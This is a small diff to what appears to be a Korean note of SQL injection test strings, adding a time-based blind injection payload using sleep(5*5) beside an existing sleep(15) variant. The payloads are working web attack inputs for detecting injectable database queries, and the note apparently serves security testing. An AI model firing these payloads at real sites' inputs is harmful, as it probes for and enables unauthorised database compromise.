@@ -18,7 +18,8 @@ SqIinjection 테스트 코드
 
 시간 기반 테스트 
 ```
-'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z 
+'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 ```
 
 테스트
